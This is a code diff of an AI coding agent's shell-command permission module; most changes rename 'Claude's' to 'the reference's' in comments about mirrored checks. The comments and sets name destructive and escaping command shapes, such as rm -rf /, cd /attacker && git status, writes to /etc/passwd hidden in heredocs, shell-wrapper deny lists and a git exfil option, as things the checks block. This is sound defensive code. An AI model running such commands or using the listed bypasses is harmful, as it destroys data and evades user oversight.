+ * Mirrors the reference's getPathsForPermissionCheck. Non-existent / unreadable hops stop
  * the walk gracefully and still return what was collected.
  *
  * `precomputedPathsToCheck` — when the caller ALREADY holds the canonical, fully
  * symlink-resolved form of `filePath` (e.g. the output of `fs.realpathSync`), the
  * hop list is trivially those paths and the lstat/readlink chain can be skipped
  * entirely. Passing it returns a copy directly, saving up to `maxDepth` syscalls
- * per inner check. Parity with Claude's `isPathAllowed(…, precomputedPathsToCheck)`
+ * per inner check. Parity with the reference's `isPathAllowed(…, precomputedPathsToCheck)`
  * canonical fast-path (utils/permissions/pathValidation.ts L139-146). Do NOT pass
  * it for a non-canonical path (a nonexistent target, a path with unresolved
  * symlink components) — parent-directory symlink resolution is still required there.
@@ -2840,7 +2840,7 @@ const _REALPATH_MISS = '';
  * fold a symlinked workspace root; those bases do not change their canonical
  * target within a session, so re-running the syscall per base per check is pure
  * redundant I/O — N bases × M checks lstat/readlink walks. Memoizing collapses it
- * to one realpath per distinct base. Parity with Claude's session-stable config
+ * to one realpath per distinct base. Parity with the reference's session-stable config
  * path memoization (`memoize(getPathsForPermissionCheck)` /
  * `getResolvedWorkingDirPaths`, utils/permissions/pathValidation.ts L126-128).
  *
@@ -2924,7 +2924,7 @@ const WINDOWS_DRIVE_CHILD_REGEX = /^[A-Za-z]:\/[^/]+$/;
  *   grandchild (`/usr/local` is left to the normal flow);
  * - a direct child of a Windows drive root (`C:\Windows`, `C:\Users`).
  *
- * Mirrors Claude's `isDangerousRemovalPath` (utils/permissions/pathValidation.ts).
+ * Mirrors the reference's `isDangerousRemovalPath` (utils/permissions/pathValidation.ts).
  */
 export function isDangerousRemovalPath(resolvedPath: string): boolean {
   // Collapse mixed/duplicated separators so `C:\\Windows` (valid in PowerShell)
@@ -2957,7 +2957,7 @@ export function isDangerousRemovalPath(resolvedPath: string): boolean {
  * `&&`/`||`/`;`/`|` segment is inspected independently) and tilde-aware (`~`
  * expands to the home directory; relative operands resolve against `cwd`), so
  * `rm -rf ~`, `rm -rf /srv`, `rm -rf *` and `rm -rf C:\` are all caught even
- * where the enumerated system-directory hardline list is not. Mirrors Claude's
+ * where the enumerated system-directory hardline list is not. Mirrors the reference's
  * BashTool `checkDangerousRemovalPaths` (tools/BashTool/pathValidation.ts).
  */
 export function commandHasDangerousRemoval(command: string, cwd: string = process.cwd()): boolean {
@@ -2967,7 +2967,7 @@ export function commandHasDangerousRemoval(command: string, cwd: string = proces
     if (base !== 'rm' && base !== 'rmdir') continue;
     for (const rawPath of extractCommandPaths(trimmed)) {
       // Strip surrounding quotes, then expand a leading `~` / resolve relatives —
-      // mirroring Claude's expandTilde + resolve(cwd, …) before the predicate.
+      // mirroring the reference's expandTilde + resolve(cwd, …) before the predicate.
       const cleaned = rawPath.replace(/^['"]|['"]$/g, '');
       let resolved: string;
       if (cleaned === '~' || cleaned.startsWith('~/')) {
@@ -2999,12 +2999,12 @@ const SHELL_WRAPPERS = new Set([
   // command hides behind `powershell -Command "<denied>"` / `pwsh -c …` /
   // `cmd /c …` / `bash.exe -c …` and the deny/allow rule never sees it. This is
   // the decomposition half of the protection BARE_SHELL_PREFIXES already gives
-  // at the prefix-suggestion boundary (Claude's DANGEROUS_SHELL_PREFIXES).
+  // at the prefix-suggestion boundary (the reference's DANGEROUS_SHELL_PREFIXES).
   'cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe', 'bash.exe',
   'env', 'sudo', 'su', 'doas', 'nohup', 'nice', 'timeout',
   'xargs', 'exec', 'eval',
   // `time <cmd>` measures the inner command's runtime — the SAFETY of the line is
-  // the safety of the inner command, so unwrap it (Claude's `time` command spec).
+  // the safety of the inner command, so unwrap it (the reference's `time` command spec).
   'time',
   // `stdbuf [opts] <cmd>` only tweaks the inner command's stdio buffering — the
   // safety of the line is the inner command's. bash-security's SAFE_WRAPPERS
@@ -3012,7 +3012,7 @@ const SHELL_WRAPPERS = new Set([
   // existing stdbuf operand-skip below becomes reachable.
   'stdbuf',
   // `srun [opts] <cmd>` is a SLURM launcher whose trailing operand is itself a
-  // command run on cluster nodes (Claude's srun spec marks that arg isCommand).
+  // command run on cluster nodes (the reference's srun spec marks that arg isCommand).
   // Unwrap it so `srun rm -rf /` / `srun mkfs …` classify on the INNER command
   // rather than the opaque `srun` token.
   'srun',
@@ -3075,7 +3075,7 @@ function findMatchingParen(s: string, start: number): number {
  * before it stops. A maliciously deep nesting chain
  * (`$( $( $( … rm -rf / … ) ) )`) would otherwise recurse unbounded and blow the
  * call stack (RangeError) or hang permission evaluation — a denial-of-service on
- * the safety layer itself. Mirrors Claude Code's `recursionDepth > 10` boundary in
+ * the safety layer itself. Mirrors the reference's `recursionDepth > 10` boundary in
  * `utils/bash/prefix.ts`. Beyond the cap the decomposition returns what it has
  * collected so far; the width guard ({@link MAX_SUBCOMMANDS_FOR_SECURITY_CHECK})
  * independently fails compound commands closed, so a command too deep to fully
@@ -3087,7 +3087,7 @@ function extractBaseCommands(command: string, depth = 0): string[] {
   const commands: string[] = [];
 
   // Bounded recursion: a pathologically deep wrapper/substitution chain must not
-  // blow the stack or hang the permission check (DoS). Mirrors Claude's
+  // blow the stack or hang the permission check (DoS). Mirrors the reference's
   // recursionDepth>10 guard — stop descending past the cap.
   if (depth > MAX_COMMAND_PARSE_DEPTH) return commands;
 
@@ -3177,7 +3177,7 @@ function extractBaseCommands(command: string, depth = 0): string[] {
         // `srun` has value-taking options that consume the NEXT token as a count
         // (`-n 4`, `--ntasks 4`, `-N 2`, `--nodes 2`). The generic flag skip above
         // only drops the `-flag` token itself, so without this the count operand
-        // would be mis-read as the wrapped command. Mirrors Claude's srun spec
+        // would be mis-read as the wrapped command. Mirrors the reference's srun spec
         // option model so `srun -n 4 rm -rf /` reaches the inner `rm`.
         if (wrapper === 'srun' && SRUN_VALUE_FLAGS.test(flag)
             && i < tokens.length && /^\d/.test(tokens[i]!)) {
@@ -3227,7 +3227,7 @@ function extractBaseCommands(command: string, depth = 0): string[] {
       // flags and the values they consume, so `git -C /repo status` yields the
       // `git status` base (not just `git -C /repo`) and matches SAFE_PREFIXES.
       // Added alongside the raw adjacent-token bases above — never replaces them —
-      // so existing matches are preserved. Mirrors Claude's findFirstSubcommand
+      // so existing matches are preserved. Mirrors the reference's findFirstSubcommand
       // spec-driven flag-value skipping (utils/shell/specPrefix.ts).
       const spec = bashSpecFor(cmd);
       if (spec) {
@@ -3268,7 +3268,7 @@ function allSegmentsKnown(command: string): boolean {
     // Spec-driven retry: if the raw first-N tokens didn't match, skip leading
     // global flags (and their values) for a known-schema CLI and test the
     // flag-skipped `command subcommand` prefix, so `git -C /repo status` matches
-    // `git status`. Mirrors Claude's spec-driven prefix extraction.
+    // `git status`. Mirrors the reference's spec-driven prefix extraction.
     if (!found && cmdTokens.length > 0) {
       const spec = bashSpecFor(cmdTokens[0]!);
       if (spec) {
@@ -3286,7 +3286,7 @@ function allSegmentsKnown(command: string): boolean {
 
 /**
  * Benign edit-adjacent filesystem-mutation commands that `acceptEdits` mode may
- * auto-allow, mirroring Claude's ACCEPT_EDITS_ALLOWED_COMMANDS
+ * auto-allow, mirroring the reference's ACCEPT_EDITS_ALLOWED_COMMANDS
  * ([mkdir, touch, rm, rmdir, mv, cp, sed]). AMI DELIBERATELY excludes `rm`/`rmdir`:
  * its destructive-command safety invariant keeps every deletion gated behind an
  * explicit prompt even in acceptEdits (an intentional superset divergence —
@@ -3307,7 +3307,7 @@ const ACCEPT_EDITS_EDIT_TOOLS: ReadonlySet<string> = new Set(['file_edit', 'file
  * True when EVERY sub-command of `command` is a benign filesystem-mutation base
  * command ({@link ACCEPT_EDITS_FS_COMMANDS}). Used by `acceptEdits` mode to
  * auto-allow file-edit-adjacent shell work (`mkdir`, `touch`, `mv`, `cp`,
- * `sed -i`) the way Claude does — without broadening to arbitrary commands.
+ * `sed -i`) the way the reference does — without broadening to arbitrary commands.
  * A command substitution (`$(...)`, backticks, `$VAR`) is rejected outright so it
  * cannot smuggle a non-fs command into an otherwise-benign invocation.
  *
@@ -3315,7 +3315,7 @@ const ACCEPT_EDITS_EDIT_TOOLS: ReadonlySet<string> = new Set(['file_edit', 'file
  * cmdlet (`Set-Content`/`Add-Content`/`Out-File`/`Tee-Object`/`New-Item` file|dir)
  * is ALSO auto-allowed — the Windows counterpart of the POSIX set — via
  * {@link isAcceptEditsPowerShellWrite}, which fails closed and excludes
- * `Remove-Item` and `New-Item` link creation (parity: Claude's PowerShell
+ * `Remove-Item` and `New-Item` link creation (parity: the reference's PowerShell
  * modeValidation write-cmdlet allowlist + link-creation detection).
  */
 export function isAcceptEditsFilesystemMutation(command: string): boolean {
@@ -3340,7 +3340,7 @@ export function isAcceptEditsFilesystemMutation(command: string): boolean {
  * {@link ACCEPT_EDITS_FS_COMMANDS} the runtime {@link isAcceptEditsFilesystemMutation}
  * gate uses — no duplicate table); every other mode returns an empty list (their
  * auto-approval is classification-driven, not a fixed command set). Mirrors
- * Claude's `getAutoAllowedCommands(mode)` (BashTool/modeValidation.ts), adapted to
+ * the reference's `getAutoAllowedCommands(mode)` (BashTool/modeValidation.ts), adapted to
  * AMI's superset divergence that excludes `rm`/`rmdir` so deletions stay gated.
  * Surfaced through {@link getDefaultPermissionPatterns} (→ `/permissions defaults`)
  * so a user can see exactly which commands acceptEdits waves through.
@@ -3371,7 +3371,7 @@ export function getAutoAllowedPowerShellCmdlets(mode: PermissionMode): readonly 
  * allowlist yet still WRITE: creating a ref (`git branch <name>`, `git tag
  * <name>`), rewriting remotes (`git remote add/remove/set-url/rename`), writing
  * a file via `--output`/`-o`, or setting config (`git config key value`).
- * Claude Code's readOnlyCommandValidation.ts rejects each of these before
+ * the reference's readOnlyCommandValidation.ts rejects each of these before
  * auto-approval; this mirrors that.
  *
  * `tokens` is a single git invocation beginning at the `git` token. Returns
@@ -3414,7 +3414,7 @@ export function isGitInvocationReadOnly(tokens: string[]): boolean {
   // arbitrary attacker-controlled string to the remote in the protocol-v2
   // capability advertisement — a network WRITE / exfil primitive on a nominally
   // read-only command. `-o` is already caught by the output-flag scan above; block
-  // the long form here too. Mirrors Claude's ls-remote --server-option exclusion.
+  // the long form here too. Mirrors the reference's ls-remote --server-option exclusion.
   if (sub === 'ls-remote') {
     for (const a of rest) {
       if (a === '--server-option' || a.startsWith('--server-option=')) return false;
@@ -3478,7 +3478,7 @@ export function isGitInvocationReadOnly(tokens: string[]): boolean {
  * || …` / `cmd === 'git'` test, and the sets had DRIFTED (one counted `popd` but
  * not `set-location`; the others the reverse) so the same command was recognized
  * as a directory change by one guard and not another. These are the single
- * canonical identity checks every guard now shares, mirroring Claude's injectable
+ * canonical identity checks every guard now shares, mirroring the reference's injectable
  * `CommandIdentityCheckers` (isNormalizedCdCommand / isNormalizedGitCommand,
  * bashCommandHelpers.ts) so directory-change / git recognition is consistent and
  * independently testable.
@@ -3505,7 +3505,7 @@ export function isNormalizedGitCommand(token: string | undefined): boolean {
  * compound) command into segments, validates every git invocation via
  * isGitInvocationReadOnly, and refuses a compound that changes directory before
  * running git (`cd /attacker && git status`) — a sandbox escape where git runs
- * attacker-planted .git/hooks from the new cwd (Claude's cd+git guard).
+ * attacker-planted .git/hooks from the new cwd (the reference's cd+git guard).
  */
 export function isGitReadOnlyCommandSafe(command: string): boolean {
   const unwrapped = unwrapShellControlStructures(command);
@@ -3533,7 +3533,7 @@ export function isGitReadOnlyCommandSafe(command: string): boolean {
  * value) that names a FOREIGN host — a URL scheme (`https://`, `git://`, …), an
  * SSH-style `git@host:owner/repo`, or a 3+-segment `host/owner/repo` (2+ slashes)
  * — redirects the read at an attacker-chosen remote and must NOT be auto-approved.
- * Mirrors Claude's `ghIsDangerousCallback` (readOnlyCommandValidation.ts).
+ * Mirrors the reference's `ghIsDangerousCallback` (readOnlyCommandValidation.ts).
  * `args` is the token list AFTER the `gh <group> <subcommand>` pair.
  */
 export function ghArgsTargetForeignHost(args: string[]): boolean {
@@ -3563,7 +3563,7 @@ export function ghArgsTargetForeignHost(args: string[]): boolean {
  * {@link GH_READ_ONLY_SUBCOMMANDS} AND no argument targets a foreign host
  * ({@link ghArgsTargetForeignHost}). A non-`gh` token list is not our concern
  * (returns true). Everything unlisted (`gh pr create`, `gh api`, bare `gh`) is
- * NOT read-only, so it falls through to a prompt. Mirrors Claude's per-command
+ * NOT read-only, so it falls through to a prompt. Mirrors the reference's per-command
  * GH_READ_ONLY_COMMANDS lookup + dangerous-callback.
  */
 export function isGhInvocationReadOnly(tokens: string[]): boolean {
@@ -3633,7 +3633,7 @@ export function commandInvokesGit(command: string): boolean {
  *   directly in `cwd`.
  *
  * Each indicator is stat'd under its own try/catch so one stat error can't mask
- * another. Pure + synchronous (a permission-eval boundary check). Mirrors Claude's
+ * another. Pure + synchronous (a permission-eval boundary check). Mirrors the reference's
  * `isCurrentDirectoryBareGitRepo` (utils/git.ts). `cwd` defaults to the process cwd.
  */
 export function isDisguisedBareGitRepo(cwd: string = process.cwd()): boolean {
@@ -3676,7 +3676,7 @@ const NOOP_CWD_TARGET_RE =
  * guard or the cd+redirect desync guard would spuriously escalate an otherwise
  * benign command to an explicit prompt. Only an IDENTITY target is peeled — a
  * `cd` into a real directory shifts the resolution base for later relative paths
- * and is never stripped. Mirrors Claude's BashTool prefix normalization, which
+ * and is never stripped. Mirrors the reference's BashTool prefix normalization, which
  * removes a leading `cd <cwd>` subcommand before counting cd commands / running
  * per-subcommand permission evaluation.
  */
@@ -3703,7 +3703,7 @@ export function stripLeadingNoopCd(command: string): string {
  * (`>`/`>>` to a file, not an fd-dup like `2>&1`). The validator classifies the
  * redirect target against the launch cwd, but at runtime it resolves against the
  * NEW cwd — a path-resolution/TOCTOU desync that can write outside the workspace
- * (`cd /outside && echo payload > config`). Claude requires manual approval for
+ * (`cd /outside && echo payload > config`). the reference requires manual approval for
  * this shape (pathValidation.ts cd+write guard, PowerShell Set-Location desync).
  */
 export function commandHasCdWriteDesync(command: string): boolean {
@@ -3731,7 +3731,7 @@ export function commandHasCdWriteDesync(command: string): boolean {
  * Count the directory-change segments (`cd`/`pushd`/`chdir`/PowerShell
  * `Set-Location`) in a (possibly compound) command. More than one directory
  * change in a single command is an unusual navigation pattern that defeats
- * cwd-relative path validation and must require approval (Claude's multi-cd
+ * cwd-relative path validation and must require approval (the reference's multi-cd
  * guard, bashCommandHelpers.ts).
  */
 export function countDirectoryChanges(command: string): number {
@@ -3759,7 +3759,7 @@ export function countDirectoryChanges(command: string): number {
  * long-lived process matching many distinct rules can never grow this cache
  * without bound (dotAll `s`: `*` also spans embedded newlines, so a rule like
  * `*rm -rf*` still matches a multi-line command and a deny cannot be bypassed by
- * splitting the command across lines — Claude's dotAll wildcard matching).
+ * splitting the command across lines — the reference's dotAll wildcard matching).
  */
 const _compilePattern = memoizeWithLRU(
   // The cache key is prefixed with `i` (case-insensitive) or `s` (case-sensitive)
@@ -3774,7 +3774,7 @@ const _compilePattern = memoizeWithLRU(
  * canonical wildcard matcher reused by MCP-server allowlists, permission rules
  * and the HTTP-hook URL allowlist — do not re-implement it per site.
  *
- * `caseInsensitive` (default false) adds the regex `i` flag, mirroring Claude's
+ * `caseInsensitive` (default false) adds the regex `i` flag, mirroring the reference's
  * `matchWildcardPattern(pattern, command, caseInsensitive)` (shellRuleMatching.ts
  * L90-L94/L150). It is used for case-insensitive filesystems (macOS/Windows) where
  * a path deny/allow rule should match regardless of letter-case.
@@ -3785,7 +3785,7 @@ export function wildcardMatch(pattern: string, value: string, caseInsensitive = 
 
 /**
  * Compile a glob-like pattern to a regex source, honouring backslash escapes so
- * a pattern can match a LITERAL asterisk or backslash (Claude's matchWildcardPattern
+ * a pattern can match a LITERAL asterisk or backslash (the reference's matchWildcardPattern
  * escape handling, shellRuleMatching.ts): an UNescaped `*` is the wildcard
  * (`.*`), `\*` is a literal `*`, and `\\` is a literal `\`. A lone backslash
  * before any other character stays a literal backslash (back-compat). Every
@@ -3811,7 +3811,7 @@ export function globToRegexSource(pattern: string): string {
   // `git *` matches the bare `git` command AND `git add`, aligning wildcard rules
   // with prefix (`git:*`) semantics — by making the trailing segment optional.
   // Multi-wildcard patterns (e.g. `* run *`) are deliberately excluded so they
-  // keep their strict meaning. Mirrors Claude's shellRuleMatching trailing-
+  // keep their strict meaning. Mirrors the reference's shellRuleMatching trailing-
   // wildcard-optional rewrite.
   if (unescapedStars === 1 && pattern.endsWith(' *') && out.endsWith(' .*')) {
     out = out.slice(0, -3) + '( .*)?';
@@ -3840,7 +3840,7 @@ function matchPattern(pattern: string, value: string, caseInsensitive = false): 
 
 /**
  * Resolve a FILE permission-rule pattern to its `(relativePattern, root)` pair,
- * mirroring Claude Code's `patternWithRoot`
+ * mirroring the reference's `patternWithRoot`
  * (references/claude/claude-code-main/src/utils/permissions/filesystem.ts L852-917).
  *
  * The pattern's leading sigil chooses the directory it is anchored to, so the SAME
@@ -3885,7 +3885,7 @@ export function patternWithRoot(
  * start matching the file it names).
  *
  * A trailing `/**` is treated gitignore-style: it matches BOTH the directory itself
- * and everything inside it (parity with Claude stripping `/**` before handing the
+ * and everything inside it (parity with the reference stripping `/**` before handing the
  * pattern to the `ignore` library, which matches a bare `dir` against `dir` and
  * `dir/anything`).
  */
@@ -3922,7 +3922,7 @@ export function normalizeLineContinuations(cmd: string): string {
   // newline). With an EVEN run the backslashes pair up as literal escapes and
   // the newline is a REAL command separator that must be KEPT — otherwise
   // `echo \\<newline>rm -rf /` would be mis-joined into one command and the
-  // second statement could slip past an end-anchored pattern. Mirrors Claude's
+  // second statement could slip past an end-anchored pattern. Mirrors the reference's
   // odd/even backslash-count discrimination (utils/bash/commands.ts L96-139).
   let out = '';
   for (let i = 0; i < cmd.length; i++) {
@@ -3944,14 +3944,14 @@ export function normalizeLineContinuations(cmd: string): string {
 
 /**
  * Prepare a raw command for compound-splitting / rule-matching in the SECURITY
- * ordering Claude Code relies on: extract (strip) heredoc BODIES *before* joining
+ * ordering the reference relies on: extract (strip) heredoc BODIES *before* joining
  * `\<newline>` line-continuations, then join. Order matters for correctness AND
  * security — joining continuations first can shift a heredoc's closing delimiter
  * (`x\<newline>DELIM` → `xDELIM`) so that a real post-heredoc statement such as
  * `> /etc/passwd` gets swallowed INTO the heredoc body and never reaches the
  * sub-command matcher, letting an `allow` rule auto-approve a command whose
  * dangerous tail it never saw. {@link stripHeredocBodies} removes those bodies up
- * front (matching Claude's `extractHeredocs`-before-join invariant in
+ * front (matching the reference's `extractHeredocs`-before-join invariant in
  * utils/bash/commands.ts L642-683), so the continuation-join and the subsequent
  * {@link splitCompoundCommand} only ever operate on the real COMMAND text.
  *
@@ -3981,7 +3981,7 @@ function splitCompoundCommand(cmd: string): string[] {
  * Above the cap we FAIL CLOSED — the command is treated as unsafe and an allow
  * rule cannot auto-approve it, so it falls back to a prompt. A pathologically
  * wide `a && b && c && …` chain otherwise runs the full validator set per segment
- * and can starve the event loop (Claude's MAX_SUBCOMMANDS_FOR_SECURITY_CHECK,
+ * and can starve the event loop (the reference's MAX_SUBCOMMANDS_FOR_SECURITY_CHECK,
  * CC-643). Fifty is generous — legitimate user commands do not split that wide.
  */
 export const MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50;
@@ -3999,7 +3999,7 @@ function extractCommandSubstitutions(command: string): string[] {
   const results: string[] = [];
   const walk = (s: string, depth: number): void => {
     // Bounded recursion: a deeply-nested substitution chain must not blow the
-    // stack or hang deny-matching (DoS). Mirrors Claude's recursionDepth>10 guard.
+    // stack or hang deny-matching (DoS). Mirrors the reference's recursionDepth>10 guard.
     if (depth > MAX_COMMAND_PARSE_DEPTH) return;
     for (let i = 0; i < s.length; i++) {
       if (s[i] === '$' && i + 1 < s.length && s[i + 1] === '(') {
@@ -4038,7 +4038,7 @@ export function stripEnvVarPrefix(cmd: string, safeEnvOnly = false): string {
   // `LD_PRELOAD=x` STAYS in the command and breaks the match — forcing a prompt
   // instead of silently auto-approving. Deny/ask matching strips ALL assignments
   // aggressively so a denied command cannot hide behind any env-var prefix.
-  // Mirrors Claude's split (allow = safe-list strip, deny = strip-all).
+  // Mirrors the reference's split (allow = safe-list strip, deny = strip-all).
   if (safeEnvOnly) {
     // Drop leading assignments one at a time, but STOP at the first non-safe var
     // (it stays, breaking any allow match). The command tail is preserved exactly.
@@ -4058,7 +4058,7 @@ export function stripEnvVarPrefix(cmd: string, safeEnvOnly = false): string {
   // POINT so interleaved layers fully reduce. A single pass stops at the first
   // non-wrapper token, so `timeout 5 FOO=bar curl` would keep the `FOO=bar`
   // prefix and miss a `curl` deny rule; looping reduces it to `curl` (strip
-  // `timeout 5` → strip `FOO=bar` → `curl`). Mirrors Claude's fixed-point
+  // `timeout 5` → strip `FOO=bar` → `curl`). Mirrors the reference's fixed-point
   // composition of stripSafeWrappers + stripAllLeadingEnvVars for deny rules.
   let stripped = cmd;
   for (;;) {
@@ -4102,14 +4102,14 @@ const SUBCOMMAND_SHAPE_RE = /^[a-z][a-z0-9]*(-[a-z0-9]+)*$/;
  * scope: shells and arg-executing wrappers (a `bash:*` / `env:*` / `sudo:*` rule
  * auto-approves arbitrary code via `-c` or by wrapping any command) plus
  * cross-platform code interpreters (a `node:*` / `python:*` rule would
- * auto-allow arbitrary code execution). Mirrors Claude's BARE_SHELL_PREFIXES +
+ * auto-allow arbitrary code execution). Mirrors the reference's BARE_SHELL_PREFIXES +
  * NEVER_SUGGEST / CROSS_PLATFORM_CODE_EXEC denylists.
  */
 export const BARE_SHELL_PREFIXES = new Set([
   'sh', 'bash', 'zsh', 'fish', 'csh', 'tcsh', 'ksh', 'dash', 'cmd', 'powershell', 'pwsh',
   // Windows `.exe` shell variants — a cross-platform payload can name the
   // interpreter as `bash.exe` / `powershell.exe` / `cmd.exe`; these must be
-  // denied as a grantable prefix exactly like their bare forms (Claude's
+  // denied as a grantable prefix exactly like their bare forms (the reference's
   // DANGEROUS_SHELL_PREFIXES lists cmd.exe/powershell.exe/pwsh.exe/bash.exe).
   'cmd.exe', 'powershell.exe', 'pwsh.exe', 'bash.exe', 'sh.exe', 'zsh.exe',
   'fish.exe', 'csh.exe', 'tcsh.exe', 'ksh.exe', 'dash.exe',
@@ -4124,7 +4124,7 @@ export const BARE_SHELL_PREFIXES = new Set([
 /**
  * True if `word` names a shell/interpreter/wrapper executable that must never be
  * treated as a permission-granting prefix — matched case-insensitively so
- * Windows-style `Bash.EXE` / `PowerShell.exe` are caught too. Mirrors Claude's
+ * Windows-style `Bash.EXE` / `PowerShell.exe` are caught too. Mirrors the reference's
  * DANGEROUS_SHELL_PREFIXES guard (utils/shell/prefix.ts): accepting e.g. `bash`
  * (or a scoped `bash foo`) as a prefix would let any command through the shell
  * and defeat the permission system.
@@ -4138,7 +4138,7 @@ export function isBareShellPrefix(word: string): boolean {
  * `git:*` / `docker:*` rule would auto-allow dangerous subcommands forever
  * (`git push --force`, `docker run`). For these we refuse a bare-root suggestion
  * and require the two-word `command subcommand` form (or fall back to the exact
- * command). Mirrors Claude's DEPTH_RULES + "fig-spec declares subcommands"
+ * command). Mirrors the reference's DEPTH_RULES + "fig-spec declares subcommands"
  * bare-root guard (staticPrefix.ts L142-156).
  */
 export const SUBCOMMAND_AWARE_ROOTS = new Set([
@@ -4154,7 +4154,7 @@ export const SUBCOMMAND_AWARE_ROOTS = new Set([
  * inline-code run (`python -c`, `node -e`) stops at the interpreter. Every name
  * here is also a {@link BARE_SHELL_PREFIXES} entry (so the suggestion layer still
  * refuses a bare interpreter prefix); the ONLY form that survives is the scoped
- * module invocation (see {@link isScopedModulePrefix}). Mirrors Claude's
+ * module invocation (see {@link isScopedModulePrefix}). Mirrors the reference's
  * interpreter `-c`/`-m` special-casing in prefix extraction (specPrefix.ts).
  */
 const INTERPRETER_SPEC_NAMES: ReadonlySet<string> = new Set([
@@ -4166,13 +4166,13 @@ const INTERPRETER_SPEC_NAMES: ReadonlySet<string> = new Set([
  * it declares the global option flags that CONSUME the following token as their
  * value (so `git -C /repo status` / `kubectl -n kube-system get pods` skip the
  * flag+value to reach the real subcommand) and an optional `depth` — how many
- * words the scoped prefix should extend to (default 2). Mirrors Claude's fig-spec
+ * words the scoped prefix should extend to (default 2). Mirrors the reference's fig-spec
  * `options[].args` "does this flag take a value" (utils/shell/specPrefix.ts) and
  * its `DEPTH_RULES` per-command default depth table (utils/powershell/staticPrefix.ts).
  *
- * This is a static, parser-free analogue of Claude's dynamically-imported fig
+ * This is a static, parser-free analogue of the reference's dynamically-imported fig
  * specs — the specs those builds cannot load at runtime are exactly the ones
- * Claude hardcodes in DEPTH_RULES, so AMI hardcodes the same shallow table here.
+ * the reference hardcodes in DEPTH_RULES, so AMI hardcodes the same shallow table here.
  */
 export interface BashCommandSpec {
   /** Global flags (long or short) that consume the next token as their value. */
@@ -4185,12 +4185,12 @@ export interface BashCommandSpec {
    * command's default `depth` to reach a meaningful leaf (e.g. `gcloud compute
    * instances describe` needs depth 6, while `gcloud config list` is fine at 4).
    * When the first subcommand after the command matches a key here, that value
-   * REPLACES `depth` for this invocation. Mirrors Claude's `DEPTH_RULES` COMPOUND
+   * REPLACES `depth` for this invocation. Mirrors the reference's `DEPTH_RULES` COMPOUND
    * keys (`${command} ${firstSubcommand}` → depth), e.g. `gcloud compute`:6,
    * `gcloud beta`:6 (utils/shell/specPrefix.ts DEPTH_RULES / staticPrefix.ts
    * calculateDepth, which consults the `${command} ${sub}` key before the bare
    * command key). Keyed on the first subcommand only (not arbitrary pairs) because
-   * that is the sole compound form Claude's table uses.
+   * that is the sole compound form the reference's table uses.
    */
   subcommandDepth?: Readonly<Record<string, number>>;
 }
@@ -4208,13 +4208,13 @@ export const BASH_COMMAND_SPECS: Record<string, BashCommandSpec> = {
   gcloud: {
     valueFlags: new Set(['--project', '--account', '--configuration', '--format', '--verbosity']),
     depth: 4,
-    // Claude's DEPTH_RULES compound keys: `gcloud compute`/`gcloud beta` nest
+    // the reference's DEPTH_RULES compound keys: `gcloud compute`/`gcloud beta` nest
     // deeper (service → resource → verb) so a 4-word prefix stops short of the
     // real leaf; 6 reaches it.
     subcommandDepth: { compute: 6, beta: 6 },
   },
   // .NET CLI: a meaningful action lives at the 3rd word (`dotnet tool install`,
-  // `dotnet nuget push`, `dotnet workload install`) — parity with Claude's
+  // `dotnet nuget push`, `dotnet workload install`) — parity with the reference's
   // DEPTH_RULES[dotnet]=3. No global value-flags worth skipping before the verb.
   dotnet: { valueFlags: new Set(['-v', '--verbosity']), depth: 3 },
   npm: { valueFlags: new Set(['--prefix', '-w', '--workspace', '--registry']) },
@@ -4253,7 +4253,7 @@ function bashSpecFor(cmd: string): BashCommandSpec | undefined {
  * flag-value skip shared by prefix suggestion (getSimpleCommandPrefix), base
  * extraction (extractBaseCommands) and classification (allSegmentsKnown + the
  * docker read-only check), so a global flag before the subcommand can no longer
- * defeat SAFE_PREFIXES / DOCKER_SAFE_SUBCOMMANDS matching. Mirrors Claude's
+ * defeat SAFE_PREFIXES / DOCKER_SAFE_SUBCOMMANDS matching. Mirrors the reference's
  * findFirstSubcommand + flagTakesArg (utils/shell/specPrefix.ts L40-137).
  */
 function skipGlobalFlags(tokens: string[], start: number, spec: BashCommandSpec | undefined): number {
@@ -4275,7 +4275,7 @@ function skipGlobalFlags(tokens: string[], start: number, spec: BashCommandSpec 
  * `aws` yield a usefully-scoped prefix instead of a bare root. Returns null when
  * no subcommand-shaped token follows the command (a flag, path, number or
  * filename), so the caller falls back to the first-word / exact-command rule.
- * Mirrors Claude's getSimpleCommandPrefix + spec-driven flag-value skipping +
+ * Mirrors the reference's getSimpleCommandPrefix + spec-driven flag-value skipping +
  * DEPTH_RULES.
  */
 export function getSimpleCommandPrefix(command: string): string | null {
@@ -4293,7 +4293,7 @@ export function getSimpleCommandPrefix(command: string): string | null {
   // interpreter (→ 1 word → null → no scoped rule). Driven by the structured
   // isModule/isCommand/isDangerous attributes on the command spec, not the generic
   // subcommand-shape walk below (a module name like `http.server` is not
-  // subcommand-shaped). Mirrors Claude's buildPrefix (utils/shell/specPrefix.ts).
+  // subcommand-shaped). Mirrors the reference's buildPrefix (utils/shell/specPrefix.ts).
   if (INTERPRETER_SPEC_NAMES.has(cmd.toLowerCase())) {
     const aspec = getArgCommandSpec(cmd.toLowerCase());
     if (aspec) {
@@ -4307,7 +4307,7 @@ export function getSimpleCommandPrefix(command: string): string | null {
   // Resolve the effective depth: a COMPOUND (`command firstSubcommand`) override
   // from the spec's `subcommandDepth` wins over the command's default `depth`, so
   // a deep subcommand tree (`gcloud compute …`) extends to its real leaf while a
-  // shallow sibling keeps the default. Mirrors Claude's DEPTH_RULES compound-key
+  // shallow sibling keeps the default. Mirrors the reference's DEPTH_RULES compound-key
   // lookup (`${command} ${sub}` before the bare `${command}`).
   let depth = spec?.depth ?? 2;
   const firstSub = tokens[i];
@@ -4331,7 +4331,7 @@ export function getSimpleCommandPrefix(command: string): string | null {
 /**
  * First-word fallback prefix (e.g. `npm`, `cargo`). Skips safe env vars, rejects
  * paths/flags/numbers/filenames and anything in BARE_SHELL_PREFIXES. Mirrors
- * Claude's getFirstWordPrefix.
+ * the reference's getFirstWordPrefix.
  */
 export function getFirstWordPrefix(command: string): string | null {
   const tokens = command.trim().split(/\s+/).filter(Boolean);
@@ -4356,7 +4356,7 @@ export function getFirstWordPrefix(command: string): string | null {
  * `&> both`, `< in`, `<<<here`) from a command so a redirect *target filename*
  * never leaks into a derived permission-rule prefix (turning `npm test > out.txt`
  * into a bogus `Bash(out.txt)` rule). Quote-aware: a `>` inside single/double
- * quotes is preserved. Mirrors Claude's `commandTransform` hook on
+ * quotes is preserved. Mirrors the reference's `commandTransform` hook on
